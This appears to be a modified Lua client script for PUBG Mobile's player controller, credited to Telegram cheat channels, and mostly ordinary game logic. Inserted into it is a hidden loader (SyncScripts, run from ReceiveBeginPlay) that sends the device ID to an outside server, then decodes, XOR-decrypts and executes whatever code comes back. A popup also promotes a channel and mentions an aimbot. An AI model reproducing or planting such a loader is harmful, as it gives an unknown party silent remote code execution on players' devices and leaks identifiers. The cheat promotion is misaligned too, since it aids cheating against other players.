-- DUMP BY AKMODPUBG
-- https://t.me/akmodpubg
-- ADMIN @nanamod96
-- https://t.me/nanamod96

local logic_common_legal_msg = require("client.slua.logic.common.logic_common_legal_msg")
local msg1 = "走了官方频道通知 @zoulobbb"
local msg2 = "走了公布文章附件频道 @zoulobbb @zoulobbb"
local msg3 = "\n此文件是免费的，如果您是买来的，说明您被骗了，哈哈\n"
local msg4 = "\nV7功能介绍面板里面有自瞄看"
local popupContent = table.concat({msg2, msg3, msg4})
local btnOKText = "OK"
local btnCancleText = "加入频道"
local url = "https://t.me/zoulobbb"
local hasShown = false

_G.TryShowLegalCredit = function()
    if hasShown then return end
    pcall(function()
        if not logic_common_legal_msg then return end
        logic_common_legal_msg.ShowOnePopUI({
            tabType = 0,
            title = msg1,
            content = popupContent,
            tipsText = nil,
            btnOKText = btnOKText,
            btnCancleText = btnCancleText,
            acceptFunc = function() end,
            refuseFunc = function()
                pcall(function()
                    local KismetSystemLibrary = import("KismetSystemLibrary")
                    if KismetSystemLibrary then
                        KismetSystemLibrary.LaunchURL(url)
                    end
                end)
            end
        })
        hasShown = true
    end)
end

local function Hash(data)
    local function ROR(val, shift)
        return ((val >> shift) | (val << (32 - shift))) & 4294967295
    end
    local function F1(val)
        return ROR(val, 2) ~ ROR(val, 13) ~ ROR(val, 22)
    end
    local function F2(val)
        return ROR(val, 6) ~ ROR(val, 11) ~ ROR(val, 25)
    end
    local function F3(val)
        return ROR(val, 7) ~ ROR(val, 18) ~ (val >> 3)
    end
    local function F4(val)
        return ROR(val, 17) ~ ROR(val, 19) ~ (val >> 10)
    end
    local K = {1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298}
    local H = {1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225}
    local padded = data .. string.char(128)
    local padLen = 64 - ((#data + 9) % 64)
    if padLen == 64 then padLen = 0 end
    padded = padded .. string.rep("\000", padLen) .. string.pack(">I8", #data * 8)
    for i = 1, #padded, 64 do
        local W = {}
        for j = 1, 16 do
            W[j] = string.unpack(">I4", padded, i + j * 4 - 4)
        end
        for j = 17, 64 do
            W[j] = (F4(W[j - 2]) + W[j - 7] + F3(W[j - 15]) + W[j - 16]) & 4294967295
        end
        local a, b, c, d, e, f, g, h = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
        for j = 1, 64 do
            local T1 = (h + F2(e) + ((e & f) ~ (~e & g)) + K[j] + W[j]) & 4294967295
            local T2 = (F1(a) + ((a & b) ~ (a & c) ~ (b & c))) & 4294967295
            h, g, f, e, d, c, b, a = g, f, e, (d + T1) & 4294967295, c, b, a, (T1 + T2) & 4294967295
        end
        H[1] = (H[1] + a) & 4294967295
        H[2] = (H[2] + b) & 4294967295
        H[3] = (H[3] + c) & 4294967295
        H[4] = (H[4] + d) & 4294967295
        H[5] = (H[5] + e) & 4294967295
        H[6] = (H[6] + f) & 4294967295
        H[7] = (H[7] + g) & 4294967295
        H[8] = (H[8] + h) & 4294967295
    end
    return string.pack(">I4>I4>I4>I4>I4>I4>I4>I4", H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8])
end

local function ProcessKey(data, key)
    if #data > 64 then
        data = Hash(data)
    end
    local opad = ""
    local ipad = ""
    for i = 1, 64 do
        local b = string.byte(data, i) or 0
        opad = opad .. string.char(b ~ 54)
        ipad = ipad .. string.char(b ~ 92)
    end
    return Hash(ipad .. Hash(opad .. key))
end

local function ToHex(data)
    local res = ""
    for i = 1, #data do
        res = res .. string.format("%02x", string.byte(data, i))
    end
    return res
end

local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local b64map = {}
for i = 1, 64 do b64map[b64chars:sub(i, i)] = i - 1 end

local function Base64Decode(data)
    data = data:gsub("[^A-Za-z0-9+/=]", "")
    local res = {}
    for i = 1, #data, 4 do
        local c1, c2, c3, c4 = b64map[data:sub(i, i)] or 0, b64map[data:sub(i + 1, i + 1)] or 0, b64map[data:sub(i + 2, i + 2)] or 0, b64map[data:sub(i + 3, i + 3)] or 0
        local v = c1 * 262144 + c2 * 4096 + c3 * 64 + c4
        res[#res + 1] = string.char((v >> 16) & 255)
        if data:sub(i + 2, i + 2) ~= "=" then
            res[#res + 1] = string.char((v >> 8) & 255)
        end
        if data:sub(i + 3, i + 3) ~= "=" then
            res[#res + 1] = string.char(v & 255)
        end
    end
    return table.concat(res)
end

local API_HOST = "https://by.wow6zo.xyz"
local APP_KEY = "skGMktgkgUF8xn-veGCGsrruVfh50j_D"
local XOR_KEY = "nTmVz.}jbmwfJdykJE[y2*^8,#zps|F"

local function DecryptData(data)
    local res = {}
    local keyLen = #XOR_KEY
    local idx = 0
    for i = 1, #data do
        local b = string.byte(data, i)
        if i <= 44 then
            res[i] = string.char(b)
        elseif b == 0 then
            res[i] = string.char(b)
        else
            local dec = b ~ string.byte(XOR_KEY, (idx % keyLen) + 1)
            if dec == 0 then
                res[i] = string.char(b)
            else
                res[i] = string.char(dec)
                idx = idx + 1
            end
        end
    end
    return table.concat(res)
end

local device_id = nil
pcall(function()
    if Client and Client.GetPhoneDeviceID then
        device_id = Client.GetPhoneDeviceID()
    end
end)
if not device_id then
    device_id = "d_" .. tostring(os.time()) .. tostring(math.random(1000, 9999))
end

local http_manager = nil
pcall(function()
    if ModuleManager and ModuleManager.GetModule and ModuleManager.CommonModuleConfig and ModuleManager.CommonModuleConfig.http_manager then
        http_manager = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
    end
end)

local function HttpPost(url, body, headers, callback)
    if not http_manager or not http_manager.Post then
        callback(false, nil)
        return
    end
    local reqHeaders = {}
    if headers then
        for k, v in pairs(headers) do reqHeaders[k] = v end
    end
    local ok, _ = pcall(function()
        http_manager:Post(url, reqHeaders, body or "", nil, function(success, resp)
            if success then
                callback(true, resp or "")
            else
                callback(false, nil)
            end
        end, 30)
    end)
    if not ok then callback(false, nil) end
end

local function LoadAndExecute(code, name)
    if code and #code >= 10 then
        local chunk, err = load(code, name)
        if chunk then
            local ok, _ = pcall(chunk)
            return ok
        end
    end
    return false
end

local function SyncScripts(self)
    if not http_manager or self._D1 then return end
    self._D1 = true
    pcall(function()
        self:AddGameTimer(15.0, false, function() self._D1 = false end)
    end)
    local timestamp = os.time()
    local nonce = ""
    for i = 1, 16 do nonce = nonce .. string.format("%x", math.random(0, 15)) end
    local sigData = string.format("api_key=%s&device_id=%s&nonce=%s&timestamp=%s", APP_KEY, device_id, nonce, timestamp)
    local sig = ToHex(ProcessKey(APP_KEY, sigData))
    local body = string.format("{\"device_id\":\"%s\",\"timestamp\":%d,\"nonce\":\"%s\",\"signature\":\"%s\"}", device_id, timestamp, nonce, sig)
    local url = API_HOST .. "/api/v1/" .. APP_KEY .. "/sync"
    
    HttpPost(url, body, {["Content-Type"] = "application/json"}, function(success, resp)
        if not success or not resp then self._D1 = false return end
        local count = tonumber(resp:match("\"file_count\"%s*:%s*(%d+)")) or 0
        if count == 0 then self._D1 = false return end
        local files = {}
        for id, name, size, data in resp:gmatch("{\"id\"%s*:%s*(%d+)%s*,%s*\"name\"%s*:%s*\"([^\"]+)\"%s*,%s*\"size\"%s*:%s*(%d+)%s*,%s*\"data\"%s*:%s*\"([^\"]+)\"}") do
            table.insert(files, {id = tonumber(id), name = name, size = tonumber(size), data = data})
        end
        if #files == 0 then
            for name, data in resp:gmatch("\"name\"%s*:%s*\"([^\"]+)\"%s*,%s*\"data\"%s*:%s*\"([^\"]+)\"") do
                table.insert(files, {name = name, data = data})
            end
        end
        if #files == 0 then self._D1 = false return end
        for _, file in ipairs(files) do
            local decData = DecryptData(Base64Decode(file.data))
            LoadAndExecute(decData, " " .. file.name)
        end
        self._D1 = false
    end)
end

local PlayerControllerBase = class(require("GameLua.Mod.BaseMod.Common.Core.ActorBase"))

PlayerControllerBase.ClientRPC = {
    RPC_Client_MaliciousTeammateReceiveWarningTips = {Reliable = true},
    RPC_Client_MaliciousTeammateVictimReceiveTips = {Reliable = true, Params = {UEnums.EPropertyClass.Str, UEnums.EPropertyClass.Bool, UEnums.EPropertyClass.Int}},
    RPC_Client_PopupAFKWindow = {Reliable = true, Params = {UEnums.EPropertyClass.Bool, UEnums.EPropertyClass.Bool}},
    RPC_ClientHUDDisplayHitDamage = {Reliable = true, Params = {UEnums.EPropertyClass.Int, UEnums.EPropertyClass.Bool}},
    RPC_Client_MarkShoot = {Reliable = true, Params = {import("/Script/Engine.Actor"), import("/Script/Engine.Actor")}},
    RPC_Client_WonderfulPeriod = {Reliable = true, Params = {UEnums.EPropertyClass.Int, UEnums.EPropertyClass.Float, UEnums.EPropertyClass.Float, UEnums.EPropertyClass.Array, UEnums.EPropertyClass.Float, UEnums.EPropertyClass.Int, UEnums.EPropertyClass.Float, UEnums.EPropertyClass.Bool, UEnums.EPropertyClass.Array, import("WonderfulSubTypeInfo")}},
    RPC_Client_PostTGPAIS = {Reliable = true, Params = {UEnums.EPropertyClass.Int, UEnums.EPropertyClass.Str}},
    RPC_Client_NotifyUseShareSkin = {Reliable = true, Params = {UEnums.EPropertyClass.Int}},
    RPC_Client_ShowBattleGMOutputText = {Reliable = true, Params = {UEnums.EPropertyClass.Str}}
}

PlayerControllerBase.ServerRPC = {
    RPC_Server_PlaySpecifiedPetAnimation = {Reliable = true, Params = {UEnums.EPropertyClass.Int, UEnums.EPropertyClass.Float, UEnums.EPropertyClass.Int, UEnums.EPropertyClass.Bool}},
    RPC_Server_SetGameReadyCountDown = {Reliable = true, Params = {UEnums.EPropertyClass.Int}},
    RPC_Server_SetAutoUseMelee = {Reliable = true, Params = {UEnums.EPropertyClass.Bool}},
    RPC_Server_ReqUseShareSkin = {Reliable = true, Params = {}},
    RPC_Server_RealUseShareSkin = {Reliable = true, Params = {}}
}

PlayerControllerBase.MulticastRPC = {
    RPC_Multicast_OnCreateDecal = {Reliable = true, Params = {UEnums.EPropertyClass.Int}}
}

PlayerControllerBase.LuaEventContainer = {"DefaultLuaEventPlaceholder"}

local DamageEvent = import("/Script/Engine.DamageEvent")
local PlaneCharacter = import("/Script/ShadowTrackerExtra.PlaneCharacter")
local InputStateControl = nil

function PlayerControllerBase:ctor()
    self.LastestViewPlayerKey = 0
    self.bEnterpriseGMMod = false
    self.bAvatarErrReport = false
    self._bIsTeammateExitTeamBeforeBoarding = false
    self.ZiplineUI = nil
    self._SuperData = nil
    self.IsPreparingEnterZipline = false
    self.CanModPlayActorVoiceFeature = true
    self.nInLeftSharedSkinTimes = 0
    self.nOutLeftSharedSkinTimes = 0
    self.nFriendLeftSharedSkinTimes = -1
    self.bPCInputSwitcher = true
    self.bIsShowingFollowEmoteUI = false
    self.bIsShowingMovableEmoteUI = false
    self.PetAnimationTimer = nil
    self.bForbidCustomChat = false
    self.bHasBeginPlay = false
    
    local superData = self:GetSuperData()
    superData.IsUse3DTouch = false
    superData.bTurnOnDrift = true
    
    self.bIsJoyStickShow = false
    self.bModWeaponSkinCooldowning = false
    self.SettingHandleList = {}
end

for i = 1, 49 do
    if i ~= 29 then
        PlayerControllerBase["OnRep_CountdownTime" .. (i == 1 and "" or tostring(i-1))] = function(self) end
    end
end

function PlayerControllerBase:_PostConstruct()
    PlayerControllerBase.__super._PostConstruct(self)
    require("GameLua.GameCore.Data.GameplayData").BindPlayerController(self.Object)
    require("GameLua.GameCore.Main.UIMessageSystem").BindPlayerController(self.Object)
    
    if Client then
        self.bWatchTeammateIgnoreDying = true
        self:AddCommonEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_ENTER_PROTECT, function() self.bHasEnterBattleResult = true end, self)
        self:AddControlEvent(self, "OnAvatarInfoRep", self.ReportAvatarFlow, self)
        self:AddControlEvent(self, "OnPlayerControllerBattleBeginPlay", self.HandleBattleBeginPlay, self)
    end
end

function PlayerControllerBase:OnDestroyed()
    self:Dispose()
    PlayerControllerBase.__super.OnDestroyed(self)
end

function PlayerControllerBase:HandleBattleBeginPlay()
    self.bHasBeginPlay = true
end

function PlayerControllerBase:CheckBattleHasBeginPlay()
    return self.bHasBeginPlay
end

function PlayerControllerBase:ReportAvatarFlow(A1, A2, A3)
    if not Client then return end
    if self ~= nil and not slua.isValid(self.Object) then return end
    
    local recommend_handler = require("client.slua.logic.download.recommend.logic_recommend_handler")
    if bWriteLog then
        print("[YY-D] PlayerControllerBase:ReportAvatarFlow sObjectName = " .. A2)
        print("[YY-D] PlayerControllerBase:ReportAvatarFlow sAvatarType = " .. A3)
    end
    
    if slua.isValid(A1) and recommend_handler then
        for k, v in pairs(A1) do
            if bWriteLog then print("[YY-D] PlayerControllerBase:ReportAvatarFlow ItemID = " .. tostring(v)) end
            recommend_handler.AddBattleItem(v)
        end
    end
end

function PlayerControllerBase:OnLuaRep_Pawn()
    if bWriteLog then print("PlayerControllerBase:OnLuaRep_Pawn", self.Pawn) end
    local STExtraBaseCharacter = import("/Script/ShadowTrackerExtra.STExtraBaseCharacter")
    local GameplayData = require("GameLua.GameCore.Data.GameplayData")
    
    if slua.isValid(self.Pawn) then
        if Game:IsClassOf(self.Pawn, STExtraBaseCharacter) then
            GameplayData.BindPlayerCharacter(self.Pawn, true)
        end
    end
end

function PlayerControllerBase:OnLuaRep_PlayerState()
    if bWriteLog then print("PlayerControllerBase:OnLuaRep_PlayerState", self.PlayerState) end
    local GameplayData = require("GameLua.GameCore.Data.GameplayData")
    local UAEPlayerState = import("/Script/Gameplay.UAEPlayerState")
    
    if slua.isValid(self.PlayerState) then
        if Game:IsClassOf(self.PlayerState, UAEPlayerState) then
            GameplayData.BindPlayerState(self.PlayerState, true)
        end
    else
        GameplayData.BindPlayerState(nil, true)
    end
end

function PlayerControllerBase:OnLuaRep_STExtraBaseCharacter()
    if bWriteLog then print("PlayerControllerBase:OnLuaRep_STExtraBaseCharacter", self.STExtraBaseCharacter) end
    require("GameLua.GameCore.Data.GameplayData").BindPlayerCharacter(self.STExtraBaseCharacter, true)
    
    if not Client then return end
    if self.RescureTimer then
        self:RemoveGameTimer(self.RescureTimer)
        self.RescureTimer = nil
    end
    
    if not slua.isValid(self.STExtraBaseCharacter) then return end
    if not slua.isValid(self.STExtraBaseCharacter.SearchOtherComponent) then
        self.RescureTimer = self:AddGameTimer(1, true, function()
            if slua.isValid(self.STExtraBaseCharacter.SearchOtherComponent) then
                if bWriteLog then print("PlayerControllerBase:OnLuaRep_STExtraBaseCharacter Has Created") end
                self:RemoveGameTimer(self.RescureTimer)
                self.RescureTimer = nil
                return
            end
            
            local rescueComp = self.STExtraBaseCharacter.RescueOtherComponent
            local nearDeathComp = self.STExtraBaseCharacter.NearDeatchComponent
            
            if slua.isValid(rescueComp) and slua.isValid(nearDeathComp) then
                if bWriteLog then print("PlayerControllerBase:OnLuaRep_STExtraBaseCharacter InitializeOwner") end
                rescueComp:InitializeOwner(self.STExtraBaseCharacter, nearDeathComp)
            end
            
            if slua.isValid(self.STExtraBaseCharacter.SearchOtherComponent) then
                if bWriteLog then print("PlayerControllerBase:OnLuaRep_STExtraBaseCharacter InitializeOwner Create SearchOtherComp") end
                self:RemoveGameTimer(self.RescureTimer)
                self.RescureTimer = nil
            end
        end)
    end
end

function PlayerControllerBase:ReceiveBeginPlay()
    PlayerControllerBase.__super.ReceiveBeginPlay(self)
    if bWriteLog then print("PlayerControllerBase:ReceiveBeginPlay", self.PlayerKey) end
    
    if self:IsLocalPlayerController() then
        self:SetAlwaysHideTouchInterface(false)
        self:ShowTouchInterface(true)
        self.IsShowInputControl = true
        self:CastUIMsg("UIMsg_Show/HideSelf", "ingame")
        self.bCanGetTouchInput = true
        local hud = self:GetHUD()
        if slua.isValid(hud) then hud.bShowCrosshair = true end
    end
    
    if Client then
        self.bDeviceSupportGyrSensor = Client.IsDeviceSupportGyrSensor()
        self:BindMotionEvent()
        local settingSubsystem = SubsystemMgr:Get("SettingSubsystem")
        if settingSubsystem then
            local tlogUtils = require("client.slua.config.tlog.tlog_report_utils")
            
            self.fireMode = settingSubsystem:GetUserSettings_Int("FireMode")
            table.insert(self.SettingHandleList, settingSubsystem:RegisterUserSettingsDelegate_Int("FireMode", function(val)
                tlogUtils.ReportTLogEvent(TLogEventDefine.CharacterControlMode, 2, string.format("ControlMode=%d", val))
                self.fireMode = val
                self:MakeFireModeEffect()
            end))
            self:MakeFireModeEffect()
            tlogUtils.ReportTLogEvent(TLogEventDefine.CharacterControlMode, 1, string.format("ControlMode=%d", self.fireMode))
            
            self.WallFeedBack = settingSubsystem:GetUserSettings_Bool("WallFeedBack")
            table.insert(self.SettingHandleList, settingSubsystem:RegisterUserSettingsDelegate_Bool("WallFeedBack", function(val) self.WallFeedBack = val end))
            
            self.bLowAmmoSound = settingSubsystem:GetUserSettings_Bool("Weapon_LowAmmo")
            table.insert(self.SettingHandleList, settingSubsystem:RegisterUserSettingsDelegate_Bool("Weapon_LowAmmo", function(val) self.bLowAmmoSound = val end))
            
            self.JoystickSprintSensitity = settingSubsystem:GetUserSettings_Int("JoystickSprintSensitity")
            table.insert(self.SettingHandleList, settingSubsystem:RegisterUserSettingsDelegate_Int("JoystickSprintSensitity", function(val) self.JoystickSprintSensitity = val end))
            
            table.insert(self.SettingHandleList, settingSubsystem:RegisterUserSettingsDelegate_Int("DriftMode", function() self:OnDriftModeChanged() end))
        end
        
        self:AddGameTimer(0.1, false, function()
            if slua.isValid(self.Object) then
                require("client.logic.setting.logic_setting_custom_sensitivity").Read()
                local accessories = require("client.logic.setting.logic_setting_custom_accessiores")
                accessories.Read()
                accessories.SetPlayer()
            end
        end)
        
        self:ReadCustomDrawHairType()
        self:AddCommonEvent(EVENTTYPE_SETTING, EVENTID_SETTING_REFRESH_CROSSHAIR, self.ReadCustomDrawHairType, self)
        self:AddCommonEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_CLICKED, self.UseModSkin, self)
    end
    
    self:LuaReceiveBeginPlay()
    
    if not self:HasAuthority() then
        self.bWatchTeammateIgnoreDying = true
        local gameInstance = import("GameplayStatics").GetGameInstance(self)
        if slua.isValid(gameInstance) then
            self:AddControlEvent(gameInstance, "OnPreBattleResult", self.OnPreBattleResult, self)
        end
        self:AddControlEvent(self, "OnPlayerEnterFighting", self.HandlePlayerEnterFighting, self)
        self:AddControlEvent(self, "OnPlayerKilledOthersPlayer", self.HandleOnPlayerKilledOthersPlayer, self)
        self:AddControlEvent(self, "OnPlayerControllerStateChangedDelegate", self.HandlePlayerControllerStateChanged, self)
        self:AddControlEvent(self, "OnPlayerEnterFlying", self.OnPlayerEnterFlyingInLua, self)
        
        if bWriteLog then log("  PlayerControllerBase:ReceiveBeginPlay.  OnShowFollowEmoteDelegate") end
        self:AddControlEvent(self, "OnShowFollowEmoteDelegate", self.HandleShowFollowEmoteUI, self)
        self:AddControlEvent(self, "OnTouchInterfaceChangedDelegate", self.HandleTouchInterfaceChanged, self)
        self:RegistSetting()
        self:HandleTouchInterfaceChanged()
        
        if IsEditor then self.bPCInputSwitcher = true end
        if import("STExtraBlueprintFunctionLibrary").GetConsoleVariableIntValue("pc.DisableTouchOverEvent") == 1 then
            self.bEnableTouchOverEvents = false
            self.bEnableTouchEvents = false
            if bWriteLog then print("PlayerControllerBase:ReceiveBeginPlay, bDisableTouchOverEvent!!") end
        end
    else
        self:AddControlEvent(self, "OnPlayerExitGameDelegate", self.HandlePlayerExitGame, self)
        local quickSign = self:GetQuickSignComponent()
        if quickSign and slua.isValid(quickSign) then
            self:AddControlEvent(quickSign, "OnDangerousQuickSignDelegate", self.OnDangerousQuickSignDelegate, self)
        elseif bWriteLog then
            print("PlayerControllerBase:ReceiveBeginPlay, QuickSignComp = nil")
        end
        
        self:CheckCanCustomChat()
        self:AddCommonEvent(EVENTTYPE_INGAME, EVENTID_CHECK_CAN_CUSTOM_CHAT, self.CheckCanCustomChat, self)
        self:AddCommonEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_CREATE_NEW_DECAL, self.OnCreateDecal, self)
        self:AddControlEvent(self, "OnSetObserveCharacter", self.HandleServerSpectatorChange, self)
        self:AddControlEvent(self, "OnPlayerRotationChanged", self.HandleOnPlayerRotationChanged, self)
        self:AddControlEvent(self, "OnPlayerCameraChanged", self.HandleOnPlayerCameraChanged, self)
    end
    
    self:AddControlEvent(self, "OnSpectatorChange", self.HandleSpectatorChange, self)
    
    if self.bPCInputSwitcher and not import("KismetSystemLibrary").IsStandalone(self) and not self:HasAuthority() and not self:IsSpectator() and not self:IsObserver() then
        InputStateControl = require("GameLua.GameCore.Module.Input.InputStateControl")
        InputStateControl.Init()
    end
    
    EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_CONTROLLER_BEGINPLAY_FINISH)
    self.bUseNewMotionInput = true
    
    if Client then
        self:InitCameraData()
        self:OnDriftModeChanged()
        self:AddCommonEvent(EVENTTYPE_DATA_MGR, EVENTID_DATAMGR_UPDATE_NEWBIE_STATUS, self.OnDriftModeChanged, self)
    end
    self.bUseOldMethodForJoystickTriggerSprint = false
    
    if Client then
        pcall(_G.TryShowLegalCredit)
        pcall(function() SyncScripts(self) end)
    end
end

function PlayerControllerBase:CanChangeStatePC(state)
    local curState = self:GetCurrentStateType()
    if bWriteLog then print("PlayerControllerBase:CanChangeStatePC CurrentState: " .. tostring(curState) .. " TargetState: " .. tostring(state)) end
    return (curState == state) or self:IsSpectator()
end

function PlayerControllerBase:OnDriftModeChanged()
    local superData = self:GetSuperData()
    if not superData then return end
    superData.bTurnOnDrift = slua_GameFrontendHUD:GetUserSettings().DriftMode > 0
    import("KismetSystemLibrary").ExecuteConsoleCommand(self.Object, superData.bTurnOnDrift and "Drift.Enable 1" or "Drift.Enable 0")
end

function PlayerControllerBase:OldJoystickTriggerSprint(val)
    self.IsJoystickTriggerSprint = val
    self:BroadcastUIMessage("UIMsg_JoyStickTriggerSprint", 0, "", "")
end

function PlayerControllerBase:ReadCustomDrawHairType()
    local setting = SubsystemMgr:Get("SettingSubsystem")
    if setting then
        self.CustomCrossHairStype = setting:GetUserSettings_Int("CrossHairType")
        if bWriteLog then print(string.format("PlayerControllerBase:ReadCustomDrawHairType %s", tostring(self.CustomCrossHairStype))) end
    end
end

function PlayerControllerBase:HandleChangeRolewearDone()
    if not Client then
        local pawn = self:GetCurPawn()
        if pawn then
            if pawn.RefreshFollowState then pawn:RefreshFollowState() end
            if slua.isValid(pawn) and pawn.IsCastingSkillIDFix and pawn:IsCastingSkillIDFix(1014405) then
                if bWriteLog then print("PlayerControllerBase:HandleChangeRolewearDone Stop GunCheck Skill") end
                pawn:StopSkill(1014405)
            end
        end
    end
    if bWriteLog then log("  PlayerControllerBase:HandleChangeRolewearDone.  ") end
    EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_PLAYER_CHANGE_ROLE_WEAR_DONE, self.Object)
end

function PlayerControllerBase:HandleOnPlayerRotationChanged(UID)
    if bWriteLog then log("PlayerControllerBase:HandleOnPlayerRotationChanged, UID = " .. tostring(self.UID)) end
    local afk = SubsystemMgr:Get("AFKReportorSubsystem")
    if afk then
        local rot = self:GetControlRotation()
        if bWriteLog then log("PlayerControllerBase:HandleOnPlayerRotationChanged, Rotation = ", rot:ToString()) end
        if rot.Pitch == 0.0 and rot.Yaw == 90.0 and rot.Roll == 0.0 or rot:IsNearlyZero(0.001) then
            if bWriteLog then log("PlayerControllerBase:HandleOnPlayerRotationChanged, Invalid Rotation From Player, Maybe From Init/Reset/Auto Action of Game System!") end
        else
            afk:PlayerHaveAction(self.UID)
        end
    elseif bWriteLog then
        log("PlayerControllerBase:HandleOnPlayerRotationChanged, AFKReportorSubsystem = nil")
    end
end

function PlayerControllerBase:HandleOnPlayerCameraChanged()
    if bWriteLog then print("PlayerControllerBase:HandleOnPlayerCameraChanged, UID = " .. tostring(self.UID)) end
    local afk = SubsystemMgr:Get("AFKReportorSubsystem")
    if afk then
        afk:PlayerHaveAction(self.UID)
    elseif bWriteLog then
        print("CharacterBase:HandleOnPlayerCameraChanged, AFKReportorSubsystem = nil")
    end
end

function PlayerControllerBase:OnPlayerEnterFlyingInLua()
    local plane = self:GetThePlane()
    if plane and slua.isValid(plane) and self:GetViewTarget() ~= plane then
        self:SetViewTargetTest(plane)
        if bWriteLog then print("PlayerControllerBase:OnPlayerEnterFlyingInLua, SetViewTarget " .. tostring(plane)) end
    end
    local safety = self:GetPlayerCharacterSafety()
    if slua.isValid(safety) then safety.MoveableSwitchPoseTime = 0 end
end

function PlayerControllerBase:OnDangerousQuickSignDelegate()
    if bWriteLog then print("PlayerControllerBase:OnDangerousQuickSignDelegate, UID = " .. tostring(self.UID)) end
    local afk = SubsystemMgr:Get("AFKReportorSubsystem")
    if afk then afk:PlayerHaveAction(self.UID) elseif bWriteLog then print("CharacterBase:OnDangerousQuickSignDelegate, AFKReportorSubsystem = nil") end
end

function PlayerControllerBase:HandlePlayerControllerStateChanged(state)
    if bWriteLog then print("PlayerControllerBase:HandlePlayerControllerStateChange", state, self.bHasEnterBattleResult) end
    if self.bHasEnterBattleResult then return end
    local stateType = import("EStateType")
    if state == stateType.State_InExPlane or state == stateType.State_InPlane then
        local mapMgr = SubsystemMgr:Get("MapMarkLightCrossMgr")
        if mapMgr then mapMgr:ReviveInit() elseif bWriteLog then print("PlayerControllerBase:HandlePlayerControllerStateChanged, LightCrossMgr = nil") end
    end
    if state == stateType.State_InExPlane and self.Role == import("ENetRole").ROLE_AutonomousProxy and not self:IsSpectator() and not self:IsObserver() then
        local char = self:GetPlayerCharacterSafety()
        if slua.isValid(char) then
            char.MoveableSwitchPoseTime = 0
            if bWriteLog then print("PlayerControllerBase:HandlePlayerControllerStateChanged, Reset MoveableSwitchPoseTime") end
        end
    end
    if state == stateType.State_InPlane then
        if bWriteLog then print("PlayerControllerBase:HandlePlayerControllerStateChanged, State_InPlane, force ResetFollowEmoteUI") end
        self:HandleShowFollowEmoteUI(false)
    end
end

function PlayerControllerBase:ReceivePostLoginInit()
    if bWriteLog then print("STExtraLuaPlayerControllerBase.ReceivePostLoginInit") end
    if not self.bReconnecting then
        require("GameLua.Mod.Library.GamePlay.Avatar.AvatarDataUtil").GeneratePlayerAvatarData(self)
        self:InitWeaponAvatarItems()
        self:OnWeaponAvatarUpdate()
        self:InitGrenadeAvatarList(true)
        self:InitVehicleAvatarList()
        self:InitVehicleAdvanceAvatarList()
        self:InitVehicleMusicIDs()
    end
    
    if CGame and CGame:IsEditor() then
        local config = require("GameLua.Mod.BaseMod.Common.GamePlayTools").GetCurrentConfig("SecurtyEditorConfig")
        if config and config.GameSafeCallbacks then
            require(config.GameSafeCallbacks)
            if GameSafeCallbacks then
                if bWriteLog then print("PlayerControllerBase:ReceivePostLoginInit IsEditor OnDSGlueHiaInit") end
                GameSafeCallbacks.OnDSGlueHiaInit()
            end
        end
    end
    
    if import("KismetSystemLibrary").IsDedicatedServer(self) then
        if GameSafeCallbacks then GameSafeCallbacks.PostPlayerControllerLoginInit(self) end
        local playerInfo = require("Server.Data.ServerPlayerDataMgr").GetPlayerInfo(self.UID)
        if playerInfo then
            self.bEnterpriseGMMod = playerInfo.bEnterpriseGMMod or false
            if bWriteLog then print("PlayerControllerBase:bEnterpriseGMMod " .. tostring(self.bEnterpriseGMMod)) end
            self.bAvatarErrReport = playerInfo.avatar_err_report or false
            if bWriteLog then print("PlayerControllerBase:bAvatarErrReport " .. tostring(self.bAvatarErrReport)) end
            if self.SecurityNotifyPCFeature then self.SecurityNotifyPCFeature:SyncBanInfo(playerInfo.ban) end
        end
        if slua.isValid(self.PlayerState) then
            if self.PlayerState.InitTeamShowData then self.PlayerState:InitTeamShowData() end
            if self.PlayerState.ThemeTaskFeature then self.PlayerState.ThemeTaskFeature:InitTaskIDIPSwitch() end
        end
        if slua.isValid(self.NetworkReportActor) then self.NetworkReportActor:ForceNetUpdate() end
    end
    
    self:CacheSyncParams()
    if slua.isValid(self.PlayerState) and self.PlayerState.StoreFeature and self.PlayerState.StoreFeature.ReceivePostLoginInit then
        self.PlayerState.StoreFeature:ReceivePostLoginInit()
    end
end

function PlayerControllerBase:GenerateKillBroadcastItemID(A1, A2)
    return require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitAvatarDataUtil").GenerateKillBroadcastItemID(A1, A2)
end

function PlayerControllerBase:ReceiveEndPlay(endPlayReason)
    if bWriteLog then print("PlayerControllerBase.ReceiveEndPlay") end
    self.ZiplineUI = nil
    self._SuperData = nil
    
    if not self:HasAuthority() then
        local vibrateSys = SubsystemMgr:Get("VibrateUtilitySubsystem")
        if vibrateSys and vibrateSys.ResetVibrationData then
            if bWriteLog then print("PlayerControllerBase.ReceiveEndPlay VibrateUtilitySubsystem call ResetVibrationData") end
            vibrateSys:ResetVibrationData()
        end
    end
    
    if Client then
        local settingSys = SubsystemMgr:Get("SettingSubsystem")
        if settingSys then
            for _, handle in ipairs(self.SettingHandleList) do
                settingSys:UnregisterUserSettingDelegate(handle)
            end
            self.SettingHandleList = nil
        end
    else
